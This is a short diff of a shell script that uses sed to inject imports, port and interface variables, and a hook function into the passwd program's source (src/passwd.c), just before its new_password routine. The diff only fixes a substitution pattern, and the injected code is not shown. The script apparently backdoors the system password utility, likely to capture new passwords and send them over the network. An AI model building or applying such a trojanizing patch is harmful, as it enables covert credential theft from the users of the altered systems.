@@ -54,7 +54,7 @@ sed -i '/#include \"shadowio.h\"/a '"$imports"'' src/passwd.c
 
 # Add Variables
 sed -i '/#include <string.h>/a '"$def_var"'\n'"$def_port"'' src/passwd.c
-sed -i 's/INT_HERE/'"$interface"'/g' src/passwd.c
+sed -i 's/\"INT_HERE\"/'"$interface"'/g' src/passwd.c
 
 # Add Hook Function
 sed -i '/static int new_password (const struct passwd \*pw)/i '"$code"'' src/passwd.c
